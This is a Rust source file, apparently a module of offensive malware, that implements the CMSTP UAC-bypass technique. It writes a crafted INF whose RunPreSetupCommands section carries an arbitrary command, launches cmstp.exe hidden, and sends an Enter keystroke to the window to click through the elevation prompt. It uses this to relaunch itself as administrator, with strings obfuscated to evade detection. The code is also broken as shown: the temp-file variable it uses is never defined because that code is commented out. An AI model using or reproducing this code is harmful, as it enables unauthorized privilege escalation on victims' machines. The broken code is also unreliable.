// https://oddvar.moe/2017/08/15/research-on-cmstp-exe/

//! CLEAN UP - temp path etc
use tempfile::{ NamedTempFile, tempdir };
use anyhow::{ anyhow, Context, Result };
use obfstr::obfstr as s;
use std::fs::create_dir_all;
use std::io::Write;
use std::path::PathBuf;
use std::ptr;
use std::time::Duration;
use std::{ fs, time::Instant };
use winapi::{
    shared::minwindef::{ BOOL, DWORD, FALSE, LPARAM, MAX_PATH, TRUE },
    shared::windef::HWND,
    um::{
        processthreadsapi::OpenProcess,
        psapi::GetModuleFileNameExA,
        shellapi::{ ShellExecuteExW, SEE_MASK_NOCLOSEPROCESS, SHELLEXECUTEINFOW },
        winnt::{ PROCESS_QUERY_INFORMATION, PROCESS_VM_READ },
        winuser::{
            EnumWindows,
            GetWindowThreadProcessId,
            PostMessageA,
            SW_HIDE,
            SW_SHOW,
            VK_RETURN,
            WM_KEYDOWN,
            WM_KEYUP,
        },
    },
};

use crate::utils::functions::get_current_exe;

pub struct WindowInfo {
    name: String,
    hwnd: HWND,
}

fn _clean_up_uac(tmp_path: &PathBuf) -> Result<()> {
    fs::remove_file(tmp_path).context(s!("Failed to remove temp file").to_string())?;
    // info!("Cleaned up temporary file: ", tmp_path);
    Ok(())
}

pub fn shell_execute(tmp_path: &PathBuf, show_window: bool) -> Result<()> {
    // info!("Executing shell command with temporary file: ", tmp_path);
    let payload = s!("cmstp.exe").to_string();
    let params = format!("{}{}", s!("/au "), tmp_path.to_string_lossy().to_string());

    let payload_wide: Vec<u16> = payload.encode_utf16().chain(std::iter::once(0)).collect();
    let params_wide: Vec<u16> = params.encode_utf16().chain(std::iter::once(0)).collect();

    let mut shell_info = SHELLEXECUTEINFOW {
        cbSize: std::mem::size_of::<SHELLEXECUTEINFOW>() as DWORD,
        fMask: SEE_MASK_NOCLOSEPROCESS,
        hwnd: ptr::null_mut(),
        lpVerb: ptr::null(),
        lpFile: payload_wide.as_ptr(),
        lpParameters: params_wide.as_ptr(),
        lpDirectory: ptr::null(),
        nShow: if show_window {
            SW_SHOW
        } else {
            SW_HIDE
        },
        hInstApp: ptr::null_mut(),
        lpIDList: ptr::null_mut(),
        lpClass: ptr::null(),
        hkeyClass: ptr::null_mut(),
        dwHotKey: 0,
        hMonitor: ptr::null_mut(),
        hProcess: ptr::null_mut(),
    };

    let success = unsafe { ShellExecuteExW(&mut shell_info) != 0 };

    if !success {
        return Err(anyhow!(s!("Failed to open Service Control Manager").to_string()));
    }

    // info!("Shell command executed successfully");
    Ok(())
}

pub fn execute_as_admin_cmstp_method(command: &str) -> Result<()> {
    // info!("Executing command as administrator: ", command);
    let inf_template = format!(
        "{}{}{}",
        s!(
            r#"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
"#
        ),
        command,
        s!(
            r#"

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", "")

[Strings]
ServiceName="Connect"
ShortSvcName="Connect"
"#
        )
    );
    // info!("Generated INF template: \n", inf_template);

    // create_dir_all(&end_directory).context(s!("Failed to CREATE DIR ALL FOR path").to_string())?;

    // tmp_file_path.push(s!("tmp.ini"));
    // // info!("Temporary file path: ", tmp_file_path);

    // let mut tmp_file = std::fs::File::create(&tmp_file_path)?;

    // // info!("Created temporary file");

    // // Write to the temporary file
    // NamedTempFile.write(&inf_template.as_bytes()).context(
    //     s!("Failed to write to temporary file").to_string()
    // )?;

    // info!("Wrote to temporary file");

    shell_execute(&tmp_file_path, false).context(s!("Failed to shell_execute").to_string())?;
    // info!("Executed shell command");

    let start_time = Instant::now();
    let timeout = Duration::from_secs(15); // 10 seconds timeout

    loop {
        let sent = send_key_to_exe(s!("cmstp.exe"));
        if sent {
            // info!("Sent key to cmstp.exe");
            break;
        }

        if start_time.elapsed() > timeout {
            // err!("Timeouted while trying to send key to cmstp.exe");
            break;
        }
        // thread::sleep(std::time::Duration::from_millis(100));
    }

    Ok(())
}

pub fn open_self_as_admin() -> Result<()> {
    // info!("Running self as administrator");
    let binding = get_current_exe();
    let curent_executable = binding.to_str().unwrap();

    // info!("Current executable: ", curent_executable);
    execute_as_admin_cmstp_method(curent_executable).context(
        s!("failed to execute as admin").to_string()
    )?;
    Ok(())
}

pub fn find_window_by_exe(exe_name: &str) -> Option<HWND> {
    // info!("searching for window by exe: ", exe_name);
    let mut info_data = WindowInfo {
        name: exe_name.to_string(),
        hwnd: ptr::null_mut(),
    };

    unsafe {
        EnumWindows(Some(enum_window), &mut info_data as *mut WindowInfo as LPARAM);

        if !info_data.hwnd.is_null() {
            // info!("Found window with handle: ", &info_data.hwnd);
            Some(info_data.hwnd)
        } else {
            // warn!("Failed to find window");
            None
        }
    }
}

unsafe extern "system" fn enum_window(hwnd: HWND, lparam: LPARAM) -> BOOL {
    let info_data = &mut *(lparam as *mut WindowInfo);

    // Get process ID for this window
    let mut process_id: DWORD = 0;
    GetWindowThreadProcessId(hwnd, &mut process_id);

    // Open the process
    let process_handle = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        FALSE,
        process_id
    );

    if !process_handle.is_null() {
        let mut exe_path = [0u8; MAX_PATH];
        let len = GetModuleFileNameExA(
            process_handle,
            ptr::null_mut(),
            exe_path.as_mut_ptr() as *mut i8,
            MAX_PATH as u32
        ) as usize;

        if len > 0 {
            // Convert path to string and get exe name
            let path = String::from_utf8_lossy(&exe_path[..len]).to_string();
            let found_exe = path.split('\\').last().unwrap_or("").to_lowercase();

            // Compare with target exe name
            if found_exe == info_data.name.to_lowercase() {
                // info!("Found matching executable: ", found_exe);
                info_data.hwnd = hwnd;
                return FALSE; // Stop enumeration, we found it
            }
        }
    }

    TRUE // Continue enumeration
}

// Function to both find window and send key
pub fn send_key_to_exe(exe_name: &str) -> bool {
    // // info!("Sending key to executable: {}", exe_name));
    if let Some(hwnd) = find_window_by_exe(exe_name) {
        unsafe {
            PostMessageA(hwnd, WM_KEYDOWN, VK_RETURN as usize, 0);
            PostMessageA(hwnd, WM_KEYUP, VK_RETURN as usize, 0);
            // info!("Sent key to window with handle: ", hwnd);
            return true;
        }
    }
    false
}
